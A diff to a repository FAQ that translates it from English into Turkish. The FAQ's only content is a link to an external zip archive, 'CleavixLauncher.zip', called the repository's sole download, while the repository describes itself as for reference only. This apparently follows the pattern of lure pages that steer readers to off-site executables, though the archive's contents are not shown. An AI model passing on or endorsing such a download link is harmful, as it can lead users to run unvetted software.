@@ -1,12 +1,12 @@
-# FAQ
+# SSS
 
-## Where is the download?
-The only download used in this repository is:
+## İndirme nerede?
+Bu depoda kullanılan tek indirme şudur:
 
 https://cleavix.pro/downloads/actualversion/CleavixLauncher.zip
 
-## What file should I look for?
-Use **CleavixLauncher.zip**.
+## Hangi dosyayı bulmalıyım?
+**CleavixLauncher.zip** dosyasını kullanın.
 
-## Is this repository only for reference?
-Yes. This repository is organized as a clean project page with setup notes and quick instructions.
+## Bu depo sadece referans için mi?
+Evet. Bu depo, kurulum notları ve hızlı talimatlar içeren temiz bir proje sayfası olarak düzenlenmiştir.
